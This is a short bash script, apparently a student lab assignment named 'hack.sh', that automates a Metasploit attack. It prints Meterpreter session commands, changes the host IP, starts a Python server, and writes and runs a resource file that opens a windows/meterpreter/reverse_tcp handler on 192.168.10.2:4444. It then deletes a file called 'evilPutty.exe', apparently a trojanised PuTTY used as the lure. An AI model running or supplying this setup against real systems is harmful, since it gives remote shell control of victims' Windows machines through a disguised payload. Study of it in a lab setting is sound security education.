#!/bin/bash
#  John Williams
#  105201054
#  Date: Fri. Oct. 12, 2018
#  Program: hack.sh


echo "Menu: "
echo "1. Sessions -l to see all available sessions"
echo "2. to select a session type in session # "


echo "Once you have a shell interperter you can work simply from the command line "
echo "cat "          
echo "cd "
echo "download"
echo "upload"
echo "edit"
echo "pwd"
echo "getwd"
echo "ls"
echo "mkdir"
echo "rmdir"
echo ""
echo "getlwd"
echo "lcd"
echo "lpwd"




echo "1: To edit a file say edit 'filename'"



./change_ip.sh 192.168.10.2
service apache2 stop
python3 server.py &

echo "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.10.2
set LPORT 4444
exploit -j
" > meta



msfconsole -r meta

rm -f meta
rm -f evilPutty.exe

./change_ip.sh -r


